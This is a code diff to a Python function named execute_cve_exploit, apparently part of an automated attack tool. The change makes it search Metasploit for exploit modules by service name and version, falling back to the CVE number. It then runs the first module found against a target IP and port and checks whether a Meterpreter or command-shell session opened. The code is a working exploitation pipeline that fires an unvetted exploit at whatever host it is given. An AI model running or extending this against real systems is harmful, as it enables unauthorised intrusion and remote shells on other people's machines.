@@ -13625,27 +13625,47 @@ def execute_cve_exploit():
             all_edb_ids = list(dict.fromkeys(raw_edb_ids + nvd_edb_ids))
 
             # ── Step 3: Metasploit ─────────────────────────────────────────
+            # Metasploit indexes by product/service name, NOT by CVE number.
+            # Primary search: service name (e.g. 'openssh').
+            # Fallback: free-text CVE ID search (works only if module is tagged).
             msf = shutil.which('msfconsole')
             if msf:
                 tried_any = True
-                emit(f'Metasploit found — searching modules (cve:{cve_num})...')
-                try:
-                    search_out = subprocess.run(
-                        [msf, '-q', '--no-readline', '-x', f'search cve:{cve_num} type:exploit; exit'],
-                        capture_output=True, text=True, timeout=90
-                    )
-                    raw = search_out.stdout + search_out.stderr
-                    modules = _re2.findall(r'\s+(exploit/\S+)\s', raw)
-                    if not modules:
-                        s2 = subprocess.run(
-                            [msf, '-q', '--no-readline', '-x', f'search {cve}; exit'],
-                            capture_output=True, text=True, timeout=60
-                        )
-                        modules = _re2.findall(r'\s+(exploit/\S+)\s', s2.stdout + s2.stderr)
+                msf_modules: list = []
 
-                    if modules:
-                        mod = modules[0]
-                        emit(f'Module: {mod} — running against {target_ip}:{target_port}', 'warning')
+                # Build search terms from what we know about the service
+                msf_search_terms: list = []
+                if service_name:
+                    msf_search_terms.append(f'{service_name} type:exploit')
+                    if service_ver_short:
+                        msf_search_terms.append(f'{service_name} {service_ver_short} type:exploit')
+                # CVE fallback — last resort
+                msf_search_terms.append(cve_num)
+
+                for term in msf_search_terms:
+                    if msf_modules:
+                        break
+                    emit(f'Metasploit: search {term}')
+                    try:
+                        s_out = subprocess.run(
+                            [msf, '-q', '--no-readline', '-x', f'search {term}; exit'],
+                            capture_output=True, text=True, timeout=90
+                        )
+                        msf_modules = _re2.findall(r'\s+(exploit/\S+)\s', s_out.stdout + s_out.stderr)
+                    except subprocess.TimeoutExpired:
+                        emit('Metasploit search timed out', 'warning')
+                        break
+                    except Exception as msf_err:
+                        emit(f'Metasploit error: {msf_err}', 'warning')
+                        break
+
+                if msf_modules:
+                    emit(f'Found {len(msf_modules)} Metasploit module(s):')
+                    for m in msf_modules[:8]:
+                        emit(f'  {m}')
+                    mod = msf_modules[0]
+                    emit(f'Running: {mod} against {target_ip}:{target_port}', 'warning')
+                    try:
                         cmds = (f'use {mod};set RHOSTS {target_ip};set RPORT {target_port or 0};'
                                 f'set ConnectTimeout 10;run -z;exit')
                         run_out = subprocess.run(
@@ -13661,12 +13681,12 @@ def execute_cve_exploit():
                             emit(line, lvl)
                         session_opened = bool(_re2.search(
                             r'(session \d+ opened|Meterpreter session|command shell session)', out, _re2.I))
-                    else:
-                        emit('No Metasploit modules found for this CVE', 'warning')
-                except subprocess.TimeoutExpired:
-                    emit('Metasploit timed out', 'warning')
-                except Exception as msf_err:
-                    emit(f'Metasploit error: {msf_err}', 'warning')
+                    except subprocess.TimeoutExpired:
+                        emit('Metasploit exploit timed out', 'warning')
+                    except Exception as run_err:
+                        emit(f'Metasploit run error: {run_err}', 'warning')
+                else:
+                    emit('No Metasploit modules found for this service', 'warning')
 
             # ── Step 4: searchsploit / local ExploitDB ─────────────────────
             if not session_opened:
